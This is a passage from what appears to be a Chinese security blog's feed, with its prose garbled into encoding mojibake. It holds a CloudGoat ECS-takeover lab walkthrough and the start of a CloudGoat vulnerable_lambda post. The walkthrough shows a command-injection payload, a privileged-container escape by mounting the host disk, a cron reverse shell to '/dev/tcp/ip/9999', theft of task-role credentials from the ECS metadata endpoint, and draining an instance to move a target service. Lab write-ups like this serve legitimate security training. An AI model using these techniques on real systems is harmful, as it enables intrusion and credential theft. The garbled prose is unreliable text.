<p>é™¤æ­¤ä¹‹å¤–è¿™ä¸ªè¾“å…¥è¿˜å­˜åœ¨å‘½ä»¤æ³¨å…¥<code>/?url=;echo 'hello'</code>ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050913846-f97b6ff0-f0a7-48ed-a142-9708f44a6e2d.png" alt="image.png" loading="lazy"><br>
æ—¢ç„¶å­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œé‚£é¦–å…ˆåˆ¤æ–­ä¸‹è¿™æ˜¯ä¸æ˜¯ä¸ªå®¹å™¨ç¯å¢ƒï¼Œä½¿ç”¨çš„å‘½ä»¤ä¸º<code>cat /proc/1/cgroup</code>ã€‚æœ‰ç‚¹æ„å¤–çš„æ˜¯ ECS æœåŠ¡æ‰€èµ·çš„å®¹å™¨çš„<code>cgroup</code>å­ç³»ç»Ÿéƒ½å½’åˆ°äº†<code>/ecs/[id-1]/[id-2]</code>è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œå’Œ docker çš„<code>docker/[å®¹å™¨ID]</code>æœ‰ç‚¹ä¸åŒã€‚å…·ä½“åŸå› ç°åœ¨å…ˆä¸ç®¡ï¼Œæ€»ä¹‹è¿™é‡Œåˆ¤æ–­å‡ºäº†å½“å‰ç¯å¢ƒæ˜¯åœ¨ä¸€ä¸ª docker é‡Œé¢çš„ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956048593-7bb54b01-38e1-44a5-8997-439843ca9258.png" alt="image.png" loading="lazy"></p>
<p>åœ¨å‰é¢æˆ‘ä»¬ï¼ˆå·å·åœ°ï¼‰çŸ¥é“äº†è¿™ä¸ªå®¹å™¨æœ‰ä¸¤ä¸ªå±é™©çš„é…ç½®ï¼Œä¸€ä¸ªæ˜¯ç‰¹æƒæ¨¡å¼</p>
<pre><code class="language-yaml">cat /proc/$$/status | grep CapEff
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956287499-bd7901f3-546a-4a01-93b3-bb21561d3979.png" alt="image.png" loading="lazy"></figure>
<p>ä¸€ä¸ªæ˜¯docker socketæŒ‚è½½</p>
<pre><code class="language-yaml">ls -lah /var/run/docker.sock
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956353451-73921687-3537-4c2e-8668-d10860466640.png" alt="image.png" loading="lazy"></figure>
<p>è¿™ä¸¤ç§æ¼æ´éƒ½å¯ä»¥æ¥åšå®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œè¦æˆ‘ä»¬ä½¿ç”¨ç‰¹æƒæ¨¡å¼é€ƒé€¸ã€‚</p>
<p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p>
<pre><code class="language-json">fdisk -l
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721028459040-664b6bdd-6463-417f-ba61-ebc645650e4f.png" alt="image.png" loading="lazy"></figure>
<p>å°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨çš„<code>./test</code>ç›®å½•ä¸‹</p>
<pre><code class="language-yaml">mkdir ./test &amp;&amp; mount /dev/xvda1 ./test
</code></pre>
<p>å†™è®¡åˆ’ä»»åŠ¡å‰è¿˜æ˜¯è¦ç®€å•åˆ¤æ–­ä¸‹ä¸»æœºçš„ç³»ç»Ÿ</p>
<ul>
<li>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/&lt;username&gt;</code></li>
<li>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨<code>/var/spool/cron/crontabs/&lt;username&gt;</code>ï¼ŒåŒæ—¶æ–‡ä»¶æƒé™å¿…é¡»è¦<code>600</code>æ‰èƒ½æ‰§è¡Œ</li>
</ul>
<p>è¿™é‡Œ<code>/var/spool/cron/</code>ä¸‹ç›´æ¥æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠcrontrabå®šæ—¶æ–‡ä»¶å†™åˆ°<code>./test/var/spool/cron/root</code>ã€‚ç¨ç­‰ä¸€ä¼šå„¿åæ”¶åˆ°åå¼¹shell</p>
<pre><code class="language-yaml">echo &quot;* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ip/9999  0&gt;&amp;1'&quot; &gt;&gt; ./test/var/spool/cron/root
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721031745685-413b3765-7728-46d7-9d03-ac7c893dbe2e.png" alt="image.png" loading="lazy"></figure>
<p>æ§åˆ¶ä¸»æœºåï¼ŒæŸ¥çœ‹è¿è¡Œçš„å®¹å™¨ä¿¡æ¯ã€‚ç¬¬ä¸€ä¸ªæ˜¯webæœåŠ¡çš„å®¹å™¨ï¼Œç¬¬äºŒä¸ªä»»åŠ¡ï¼ˆä»å‰é¢å·å·çŸ¥é“ï¼‰æ˜¯æœ‰ Task Role çš„</p>
<pre><code class="language-yaml">docker ps -a
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032426974-e6ddad38-65e5-4b41-9890-9c7596ebe51e.png" alt="image.png" loading="lazy"></figure>
<p>è€Œè¿™é‡Œé™¤äº†ä¸¤ä¸ªä»»åŠ¡å®¹å™¨å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªç”±<code>amazon-ecs-agent</code>é•œåƒå¯åŠ¨çš„å®¹å™¨ã€‚è¿™ä¸ªå°±æ˜¯å®ä¾‹è‡ªåŠ¨å®‰è£… ECS å®¹å™¨ä»£ç†ï¼Œå‚è€ƒï¼š<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html</a><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035135592-8c19cd99-99b6-4eec-a925-ce67e66ea51d.png" alt="image.png" loading="lazy"></p>
<p>è™½ç„¶æˆ‘ä»¬è·å–äº† Container Instances Role ä½†å¯¹æ•´ä¸ªé›†ç¾¤çš„å…¶ä»–ä¿¡æ¯è¿˜æ— æ³•æ„ŸçŸ¥ï¼Œå› ä¸º<code>AmazonEC2ContainerServiceforEC2Role</code>å¯¹é›†ç¾¤æ²¡æœ‰ä»»ä½•è¯»å–æƒé™ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032568375-5461eab4-77a9-4846-875e-9877e3527667.png" alt="image.png" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032603603-ce61dec6-1733-4f75-b41f-20f2f835a921.png" alt="image.png" loading="lazy"></p>
<p>å› æ­¤æˆ‘ä»¬å°†ç›®æ ‡è½¬ä¸º <code>privd</code> å®¹å™¨çš„ Task Roleï¼Œå’Œ EC2 å®ä¾‹å…ƒæ•°æ®ä¸€æ ·ã€‚ECS ä¸­ä¹Ÿæœ‰ä»»åŠ¡å…ƒæ•°æ®ï¼Œè·å–æ–¹å¼å’Œå®ä¾‹å…ƒæ•°æ®ä¸€æ ·å¯ä»¥ç”¨HTTPçš„æ–¹å¼ã€‚<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html</a><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721051828122-a8b8ce80-c4f9-449f-b216-61e12b1cf02a.png" alt="image.png" loading="lazy"></p>
<p>ä¸è¿‡æ–‡æ¡£ä¸­å¹¶æ²¡æœ‰è¯´æ˜ Task Role çš„å‡­è¯å¯ä»¥é€šè¿‡ä»»åŠ¡å…ƒæ•°æ®è·å–ã€‚å…³äº Task Role çš„å‡­è¯è·å–æ˜¯åœ¨ Container credential provider çš„éƒ¨åˆ†<a href="https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html">https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html</a>ã€‚æ ¹æ®æ–‡æ¡£çš„æè¿°è¿™ä¼¼ä¹æ›´åƒä¸€ç§å¼€å‘è§„èŒƒï¼Œè·å–çš„è·¯å¾„åœ¨å®¹å™¨çš„ç¯å¢ƒå˜é‡é‡Œ<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052193373-46614cc1-a83a-4f90-888c-26a5d749517a.png" alt="image.png" loading="lazy"></p>
<p>æ‰“å°ç¬¬äºŒä¸ªå®¹å™¨çš„ç¯å¢ƒå˜é‡ï¼Œçœ‹åˆ°äº†<code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>çš„ç¯å¢ƒå˜é‡</p>
<pre><code class="language-json">docker exec 38a2028763d2 sh -c 'printenv'
HOSTNAME=38a2028763d2
SHLVL=1
HOME=/root
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/6b786c97-87aa-4a33-9c7b-c4fbef9f4638
AWS_EXECUTION_ENV=AWS_ECS_EC2
ECS_AGENT_URI=http://169.254.170.2/api/5272106b-c65e-4397-8272-9c66d4a16875
ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/5272106b-c65e-4397-8272-9c66d4a16875
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/5272106b-c65e-4397-8272-9c66d4a16875
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052329917-4ff421f4-8a0e-46fa-aa0a-93fb986696fb.png" alt="image.png" loading="lazy"></figure>
<p>è®¿é—®<code>169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>è·å– Task Role å‡­è¯</p>
<pre><code class="language-yaml">docker exec 38a2028763d2 sh -c 'wget -q -O - 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721034675973-96bd5dfd-8783-4a98-ae9c-ef58a1bfd235.png" alt="image.png" loading="lazy"></figure>
<p>ç™»å½•ç”¨æˆ·<code>privd</code><br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035025366-31b69649-937b-4d42-b504-5db4130f10a3.png" alt="image.png" loading="lazy"></p>
<p>ä¸‹é¢å¼€å§‹æ”¶é›†é›†ç¾¤ä¿¡æ¯ã€‚é¦–å…ˆï¼Œåˆ—å‡ºé›†ç¾¤</p>
<pre><code class="language-json">aws --profile task-role ecs list-clusters 
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035453529-ca13f118-76ff-44be-a6f0-592234422273.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹é›†ç¾¤çš„æ¨¡å¼ï¼Œ<code>&quot;registeredContainerInstancesCount&quot;: 2</code>å¾—çŸ¥é›†ç¾¤é‡Œè¿è¡Œçš„ EC2 æ•°é‡ä¸º 2ï¼Œè¿™ä¹Ÿè¡¨æ˜è¿™ä¸€ä¸ª EC2 Mode çš„ ECS</p>
<pre><code class="language-json">aws --profile task-role ecs describe-clusters --clusters arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721047804876-a67bd3e2-4b21-4019-8136-4095ffebcfac.png" alt="image.png" loading="lazy"></figure>
<p>åˆ—å‡ºé›†ç¾¤é‡Œçš„ Container Instances</p>
<pre><code class="language-json">aws --profile task-role ecs list-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
{
    &quot;containerInstanceArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
    ]
}
</code></pre>
<p>æŸ¥çœ‹è¿™ä¸¤ä¸ª Container Instances å¯¹åº”çš„å®ä¾‹ID</p>
<pre><code class="language-json">aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/363039e07fcf40db99d5a5c57558a50c --query &quot;containerInstances[*].ec2InstanceId&quot;
[
    &quot;i-0118453e343e82efd&quot;
]

aws --profile task-role ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --query &quot;containerInstances[*].ec2InstanceId&quot;
[
    &quot;i-0fe09f6db2ba10228&quot;
]
</code></pre>
<p>ä»å‰é¢æ§åˆ¶çš„å®ä¾‹å…ƒæ•°æ®å¯çŸ¥ï¼Œè¿™ä¸ªå®ä¾‹å¯¹åº”çš„æ˜¯ç¬¬ä¸€ä¸ª Container Instances<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048453179-cd9b2ad6-ff0d-4c13-8f1e-548c7ebc4c93.png" alt="image.png" loading="lazy"></p>
<p>åˆ—å‡ºé›†ç¾¤ä¸­çš„æœåŠ¡</p>
<pre><code class="language-json">aws --profile task-role ecs list-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster
{
    &quot;serviceArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vulnsite&quot;,
        &quot;arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/privd&quot;
    ]
}
</code></pre>
<p>è¯¥æ¸—é€åœºæ™¯çš„ç›®æ ‡æ˜¯<code>vault</code>æœåŠ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹è¯¥æœåŠ¡è¯¦ç»†çš„ä¿¡æ¯ã€‚ä»è¾“å‡ºçš„ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼š</p>
<ul>
<li><code>desiredCount</code>: æœåŠ¡æœŸæœ›è¿è¡Œçš„ä»»åŠ¡æ•°é‡ä¸º 1ã€‚</li>
<li><code>runningCount</code>: å½“å‰æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡æ•°é‡ä¹Ÿä¸º 1ã€‚</li>
<li><code>pendingCount</code>: ç­‰å¾…å¯åŠ¨çš„ä»»åŠ¡æ•°é‡ä¸º 0ï¼Œè¡¨æ˜æ²¡æœ‰ä»»åŠ¡åœ¨æ’é˜Ÿç­‰å¾…å¯åŠ¨ã€‚</li>
</ul>
<pre><code class="language-json">aws --profile task-role ecs describe-services --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --services arn:aws:ecs:us-east-1:637423561540:service/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/vault
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721048642479-bc0f3458-6881-49b3-83a7-c98ea656db1e.png" alt="image.png" loading="lazy"></figure>
<p>å†æ¥çœ‹ä¸‹è¯¥æœåŠ¡è¿è¡Œåœ¨å“ªä¸ª Container Instances ä¸Šã€‚é¦–å…ˆï¼ŒæŸ¥çœ‹æœåŠ¡ä¸­çš„ä»»åŠ¡ï¼š</p>
<pre><code class="language-json">aws --profile task-role ecs list-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --service-name vault
{
    &quot;taskArns&quot;: [
        &quot;arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f&quot;
    ]
}
</code></pre>
<p>ç„¶åï¼Œæè¿°è¿™äº›ä»»åŠ¡ä»¥è·å–å®ƒä»¬è¿è¡Œåœ¨å“ªä¸ª Container Instance ä¸Šçš„ä¿¡æ¯ã€‚æ˜¾ç¤ºçš„æ˜¯ç¬¬äºŒä¸ªæˆ‘ä»¬æ§åˆ¶å¤–çš„ EC2</p>
<pre><code class="language-json">aws --profile task-role ecs describe-tasks --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --tasks arn:aws:ecs:us-east-1:637423561540:task/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e00e1be22a134245893031ee753ff53f --query &quot;tasks[*].containerInstanceArn&quot;
[
    &quot;arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046&quot;
]
</code></pre>
<p>ä¸ºäº†å°†<code>vault</code>ç§»åˆ°å—æ§ä¸»æœºä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>vault</code>æ‰€åœ¨çš„ Container Instance çŠ¶æ€æ›´æ–°ä¸º <code>DRAINING</code>ï¼Œè¿™æ · ECS å°±ä¼šè‡ªåŠ¨å°†è¿™ä¸ªæœåŠ¡è°ƒåº¦è¦æˆ‘ä»¬è¿™å°ä¸»æœºä¸Šã€‚è€Œè¿™ä¸ªæ“ä½œå¯¹åº”çš„æƒé™<code>ecs:UpdateContainerInstancesState</code>åˆšå¥½åœ¨ Container Instance Role ä¸Šã€‚</p>
<p>é‡æ–°è·å– Container Instance Role çš„å‡­è¯ç™»å½•<br>
<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050303259-4cef4d7c-c197-4581-a230-dad911c1eba0.png" alt="image.png" loading="lazy"></p>
<p>ä¿®æ”¹å®ä¾‹çŠ¶æ€</p>
<pre><code class="language-json">aws --profile ci-role ecs update-container-instances-state --cluster arn:aws:ecs:us-east-1:637423561540:cluster/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster --container-instances  arn:aws:ecs:us-east-1:637423561540:container-instance/ecs-takeover-ecs_takeover_cgid1cex40y24h-cluster/e5edf45c9c5a44f9a21ab32987022046 --status DRAINING
</code></pre>
<p>å¾ˆå¿« task è¢«è°ƒåº¦åˆ°äº†æˆ‘ä»¬çš„å—æ§ä¸»æœºä¸Š <img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050515762-3736636e-4a31-4741-9719-9e0086c30229.png" alt="image.png" loading="lazy"></p>
<p>è¯»å–Flag</p>
<pre><code class="language-json">docker exec abe084998eb7 cat FLAG.TXT
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050582298-b153b39c-d474-4503-a0c1-77cc0b235746.png" alt="image.png" loading="lazy"></figure>
<h1 id="å‘½ä»¤æ€»ç»“">å‘½ä»¤æ€»ç»“</h1>
<pre><code class="language-json">aws ecs describe-clusters --clusters [Cluster-ARN]
aws ecs list-container-instances --cluster [Cluster-Name]
aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]
aws ecs list-services --cluster [Cluster-Name]
aws ecs describe-services --cluster [Cluster-Name] --services [Service-ARNs]
aws ecs list-tasks --cluster [Cluster-Name] --service-name [Service-Name]
aws ecs describe-tasks --cluster [Cluster-Name] --tasks [Task-ARNs]
aws ecs describe-container-instances --cluster [Cluster-Name] --container-instances [Container-Instance-ARNs]

aws ecs update-container-instances-state --cluster &lt;your_cluster_name&gt; --container-instances &lt;target_container_instance&gt; --status DRAINING
</code></pre>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://www.ruse.tech/blogs/ecs-attack-methods">https://www.ruse.tech/blogs/ecs-attack-methods</a><br>
<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/Welcome.html</a><br>
<a href="https://www.bilibili.com/video/BV12E421K7ST/">https://www.bilibili.com/video/BV12E421K7ST/</a><br>
<a href="https://www.youtube.com/watch?v=22IsSW3YD0A">https://www.youtube.com/watch?v=22IsSW3YD0A</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CloudGoat (â˜ï¸ğŸ)é¶åœºåˆä½“éªŒ]]></title>
        <id>https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/</id>
        <link href="https://skyblu3519.github.io/post/cloudgoat-ba-chang-chu-ti-yan/">
        </link>
        <updated>2024-07-09T15:58:22.000Z</updated>
        <content type="html"><![CDATA[<p>ä¸€ä¸ªå¼€æºçš„äº‘é¶åœºï¼š<a href="https://github.com/RhinoSecurityLabs/cloudgoat/">https://github.com/RhinoSecurityLabs/cloudgoat/</a></p>
<p>ä½“éªŒé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ğŸ“–</p>
<h1 id="å®‰è£…-é…ç½®">å®‰è£… &amp; é…ç½®</h1>
<p>å®‰è£…å‰ç¡®ä¿æœºå™¨ï¼š</p>
<ul>
<li>Linux or MacOS. Windows is not officially supported.
<ul>
<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>
</ul>
</li>
<li>Python3.6+ is required.</li>
<li>Terraform &gt;= 0.14 installed and in your $PATH.</li>
<li>The AWS CLI installed and in your $PATH, and an AWS account with sufficient privileges to create and destroy resources.</li>
<li>jq</li>
</ul>
<p>å®‰è£…æµç¨‹</p>
<pre><code>git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r ./requirements.txt
chmod +x cloudgoat.py
</code></pre>
<p>ç„¶åæ˜¯ä¸¤æ­¥åˆå§‹åŒ–</p>
<pre><code>./cloudgoat.py config profile
./cloudgoat.py config whitelist --auto
</code></pre>
<p>cloudgoatä¼šä½¿ç”¨æœ¬æœºä¸Š AWS CLI çš„é…ç½®ã€‚ç¼–è¾‘é…ç½®æ–‡ä»¶<code>~/.aws/credentials</code>ï¼Œæ·»åŠ cloudgoatæ‰€ç”¨çš„AWSè´¦æˆ·çš„æ–‡ä»¶æ®µ<code>[skyblu3]</code><br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720531972702-e43360e6-83e6-4a6b-b4a6-0b14500a8344.png" alt="image.png" loading="lazy"></p>
<p><code>./cloudgoat.py config profile</code>è¾“å…¥<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532044190-560aac93-f9fe-46db-8329-92fd9f87c691.png" alt="image.png" loading="lazy"></p>
<p>ç¬¬äºŒæ­¥æ˜¯é…ç½®äº‘ä¸Šå¯ä»¥éƒ¨ç½²çš„IPåˆ—è¡¨ï¼Œäº‘ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿çš„è¯å°±ç›´æ¥<code>--auto</code>è‡ªåŠ¨ç”Ÿæˆ</p>
<h1 id="é¶åœºåˆä½“éªŒ">é¶åœºåˆä½“éªŒ</h1>
<h2 id="é¶åœºæ­å»º">é¶åœºæ­å»º</h2>
<p>cloudgoatä¸­æœ‰17ä¸ªé¶åœºï¼Œåœ¨Githubé¡µé¢çš„<strong>Scenarios Available</strong>éƒ¨åˆ†å¯ä»¥å¯¼èˆªåˆ°æ¯ä¸ªé¶åœºçš„è¯¦æƒ…é¡µé¢ã€‚ç‚¹å‡»ç¬¬ä¸€ä¸ª<code>vulnerable_lambda</code>é¶åœºã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532249577-646b0f77-425c-4142-a050-a0029ba124e0.png" alt="image.png" loading="lazy"></p>
<p>é¶åœºçš„æ–‡æ¡£ä¸­åŒ…å«å¯åŠ¨çš„å‘½ä»¤ã€èµ„æºåˆ—è¡¨å’Œæ”»å‡»è·¯å¾„ï¼Œåœ¨æ—è¾¹çš„ç›®å½•åˆ—è¡¨ä¹Ÿå¯ä»¥çœ‹åˆ°ç”Ÿæˆè¯¥é¶åœºçš„tfä»£ç <br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532539521-b22352e2-075b-41bc-b628-66c20f5f2102.png" alt="image.png" loading="lazy"></p>
<p>æ¥ä¸‹æ¥å¯åŠ¨è¿™ä¸ªé¶åœº</p>
<pre><code>./cloudgoat.py create vulnerable_lambda
</code></pre>
<p>ç”ŸæˆæˆåŠŸåæ‹¿åˆ°è¿™ä¸ªé¶åœºçš„åˆå§‹è®¿é—®ç”¨æˆ·<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532685265-09d28116-ed86-4da8-9bd7-759704ae4806.png" alt="image.png" loading="lazy"></p>
<p>ç°åœ¨å°±å¯ä»¥å¼€å§‹æ¸—é€äº†</p>
<h2 id="æ¸—é€å¼€å§‹">æ¸—é€å¼€å§‹</h2>
<p>é¦–å…ˆçœ‹ä¸‹è¿™ä¸ªé¶åœºçš„æ€»ç»“</p>
<blockquote>
<p>åœ¨æ­¤åœºæ™¯ä¸­ï¼Œæ‚¨ä»¥â€œbilboâ€ç”¨æˆ·èº«ä»½å¼€å§‹ã€‚æ‚¨å°†æ‰®æ¼”ä¸€ä¸ªå…·æœ‰æ›´å¤šæƒé™çš„è§’è‰²ï¼Œå‘ç°ä¸€ä¸ªå°†ç­–ç•¥åº”ç”¨äºç”¨æˆ·çš„ lambda å‡½æ•°ï¼Œå¹¶åˆ©ç”¨è¯¥å‡½æ•°ä¸­çš„æ¼æ´æ¥æå‡ bilbo ç”¨æˆ·çš„æƒé™ä»¥æœç´¢ç§˜å¯†ã€‚</p>
</blockquote>
<p>ç”¨æä¾›çš„å‡­è¯ç™»å½•bilboç”¨æˆ·<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532908694-31fd1c96-9a36-4d2e-8bc3-118c27abdbd7.png" alt="image.png" loading="lazy"></p>
<p>ç­–ç•¥æŒ–æ˜ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„å†…è”ç­–ç•¥</p>
<pre><code class="language-json">aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720533601842-06de227d-bf47-4655-bf41-b335f6cea1c1.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹ç­–ç•¥å…·ä½“å†…å®¹</p>
<pre><code class="language-json">aws iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463 --policy-name cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer
{
    &quot;UserName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;,
    &quot;PolicyName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer&quot;,
    &quot;PolicyDocument&quot;: {
        &quot;Version&quot;: &quot;2012-10-17&quot;,
        &quot;Statement&quot;: [
            {
                &quot;Action&quot;: &quot;sts:AssumeRole&quot;,
                &quot;Effect&quot;: &quot;Allow&quot;,
                &quot;Resource&quot;: &quot;arn:aws:iam::940877411605:role/cg-lambda-invoker*&quot;,
                &quot;Sid&quot;: &quot;&quot;
            },
            {
                &quot;Action&quot;: [
                    &quot;iam:Get*&quot;,
                    &quot;iam:List*&quot;,
                    &quot;iam:SimulateCustomPolicy&quot;,
                    &quot;iam:SimulatePrincipalPolicy&quot;
                ],
                &quot;Effect&quot;: &quot;Allow&quot;,
                &quot;Resource&quot;: &quot;*&quot;,
                &quot;Sid&quot;: &quot;&quot;
            }
        ]
    }
}

</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·å¯¹IAMä¸‹çš„æ‰€æœ‰èµ„æºéƒ½æœ‰List/Getæƒé™ï¼åŒæ—¶ä»–è¿˜å¯ä»¥æ‰®æ¼”ä¸€ä¸ª<code>cg-lambda-invoker</code>è§’è‰²ã€‚åˆ—å‡ºæ‰€æœ‰IAMè§’è‰²</p>
<pre><code class="language-json">aws iam list-roles --query &quot;Roles[*].RoleName&quot;
[
    &quot;AWSServiceRoleForRDS&quot;,
    &quot;AWSServiceRoleForResourceExplorer&quot;,
    &quot;AWSServiceRoleForSupport&quot;,
    &quot;AWSServiceRoleForTrustedAdvisor&quot;,
    &quot;cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463&quot;,
    &quot;vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1&quot;
]
</code></pre>
